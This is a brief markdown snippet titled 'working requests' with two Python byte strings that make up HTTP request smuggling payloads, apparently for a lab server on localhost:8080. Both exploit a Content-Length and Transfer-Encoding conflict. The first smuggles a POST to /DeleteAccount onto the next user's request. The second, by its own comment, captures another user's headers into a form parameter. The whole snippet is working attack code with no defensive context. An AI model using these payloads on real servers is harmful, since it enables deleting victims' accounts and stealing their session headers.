# working requests

```py
    request = (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost:8080\r\n"
        b"Content-Length: 1\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"POST /DeleteAccount HTTP/1.1\r\n"
        b"x-foo: x"
    )
    # HTTP smuggling payload to leak all headers as parameter x using POST
    request2 = (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost:8080\r\n"
        b"Content-Length: 1\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"POST /social HTTP/1.1\r\n"
        b"Host: localhost:8080\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 90\r\n\r\n"
        b"x="
    )
```